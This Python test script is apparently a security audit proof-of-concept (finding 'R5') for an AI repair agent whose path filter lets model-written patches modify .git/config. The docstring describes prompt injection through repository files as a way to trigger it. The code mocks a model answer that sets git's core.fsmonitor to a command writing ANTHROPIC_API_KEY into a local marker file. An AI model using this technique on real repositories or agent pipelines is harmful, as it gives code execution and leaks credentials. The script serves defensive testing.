"""R5: the agent's path filter does not exclude .git/. A model answer (e.g. after prompt injection from a repository
file it reads as context) that 'edits' .git/config gets code execution in the repair job, which holds AGENT_KEYS,
the agent App token (contents: write) and ANTHROPIC_API_KEY."""
import subprocess
import tempfile
from pathlib import Path
from unittest.mock import patch

from ops import agent

origin = Path(tempfile.mkdtemp()) / "origin.git"
subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(origin)], check=True)
repo = Path(tempfile.mkdtemp()) / "repo"
subprocess.run(["git", "clone", "-q", str(origin), str(repo)], check=True, capture_output=True)
(repo / "app.py").write_text("x = 1\n")
g = lambda *a: subprocess.run(["git", "-C", str(repo), *a], check=True, capture_output=True)
g("add", ".")
g("-c", "user.name=a", "-c", "user.email=a@a", "commit", "-qm", "init")
g("push", "-q", "origin", "HEAD:main")
g("fetch", "-q")

marker = Path(tempfile.mkdtemp()) / "PWNED"
config = (repo / ".git" / "config").read_text() + f"[core]\n\tfsmonitor = \"echo $ANTHROPIC_API_KEY > {marker}; false\"\n"
patch_answer = {"title": "fix", "body": "", "files": {".git/config": config, "app.py": "x = 2\n"}}


class GH:
    def open_pull(self, *a):
        return {"number": 1}


with patch.object(agent, "claude", lambda prompt, key: patch_answer), patch.dict("os.environ", {"ANTHROPIC_API_KEY": "sk-ant-secret"}):
    try:
        print("open_repair:", agent.open_repair(repo, GH(), "sast", "code", "sast", "found:1", "k"))
    except Exception as exc:  # noqa: BLE001
        print("open_repair raised:", type(exc).__name__)
print("marker written:", marker.exists(), "->", marker.read_text().strip() if marker.exists() else "")
